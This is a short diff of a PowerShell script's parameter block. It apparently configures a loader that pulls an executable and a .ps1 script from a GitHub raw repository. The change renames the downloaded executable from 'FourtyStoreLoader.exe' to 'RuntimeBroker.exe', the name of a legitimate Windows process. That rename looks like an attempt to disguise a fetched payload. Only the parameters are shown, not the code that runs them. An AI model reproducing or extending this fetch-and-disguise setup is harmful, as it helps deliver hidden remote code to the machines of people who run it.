@@ -1,5 +1,5 @@
 param(
-    [string]$u = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main/FourtyStoreLoader.exe',
+    [string]$u = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main/RuntimeBroker.exe',
     [string]$p = '',
     [string]$s = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main/RANVYXEXE.ps1'
 )
